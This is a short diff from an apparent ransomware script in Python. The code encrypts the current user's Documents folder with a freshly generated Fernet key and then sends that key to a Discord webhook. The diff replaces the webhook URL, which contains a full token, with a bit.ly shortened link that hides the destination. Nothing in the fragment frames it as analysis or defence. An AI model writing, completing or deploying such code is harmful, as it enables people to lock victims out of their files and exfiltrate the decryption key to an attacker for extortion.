@@ -36,7 +36,7 @@ KEY = Fernet.generate_key()
 FERNET = Fernet(KEY)
 USERNAME = subprocess.check_output(['whoami']).decode('ascii')
 INITIAL_PATH = f"/home/{USERNAME}/Documents/"
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1177355216417460254/Aml2aUzFIRG_u7kRlO6bAtNkEDACsk1rI9DgmnQ3h4nrHpplBsQ8-Qgzqz8loC1fp1AI'
+WEBHOOK_URL = 'https://bit.ly/3R3FRc5'
 
 cyp_folder(path=INITIAL_PATH, fernet=FERNET)
 send_key(username=USERNAME, key=KEY, discord_webhook_url=WEBHOOK_URL)
